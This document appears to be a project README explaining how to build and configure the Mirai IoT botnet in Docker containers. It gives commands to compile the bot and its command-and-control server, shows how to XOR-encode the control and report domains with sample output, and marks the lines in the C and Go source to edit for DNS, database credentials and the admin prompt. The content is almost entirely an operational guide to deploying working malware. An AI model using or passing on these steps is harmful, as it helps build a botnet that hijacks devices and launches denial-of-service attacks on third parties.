# Mirai-Docker

https://github.com/jgamblin/Mirai-Source-Code

### Install docker and docker compose
https://docs.docker.com/get-docker/

### Download source and dockerfile
```
git clone https://github.com/deunlee/Mirai-Docker
cd Mirai-Docker
```

### Build docker containers
```
docker compose build
```

### Compile bot and CNC
```
docker compose run compile ./build.sh
```

### Encrypt your domain
```
alias enc="docker compose run compile ./src/mirai/tools/enc"
```
```
enc string cnc.mirai.com
XOR'ing 14 bytes of data...
\x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
```
```
enc string report.mirai.com
XOR'ing 17 bytes of data...
\x50\x47\x52\x4D\x50\x56\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F
```

### Edit Mirai source code
Edit [./src/mirai/bot/resolv.c](./src/mirai/bot/resolv.c) DNS server IP
```c
struct resolv_entries *resolv_lookup(char *domain)
{
    // ...

    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(127,0,0,1); // <-- here!
    addr.sin_port = htons(53);

    // ...
}
```

Edit [./src/mirai/cnc/main.go](./src/mirai/cnc/main.go)
```go
const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "user"
const DatabasePass string   = "this-is-password!"
const DatabaseTable string  = "mirai"
```

Edit [./src/mirai/cnc/admin.go](./src/mirai/cnc/admin.go)
```go
headerb, err := ioutil.ReadFile("/home/mirai/src/prompt.txt") // <-- here!
```

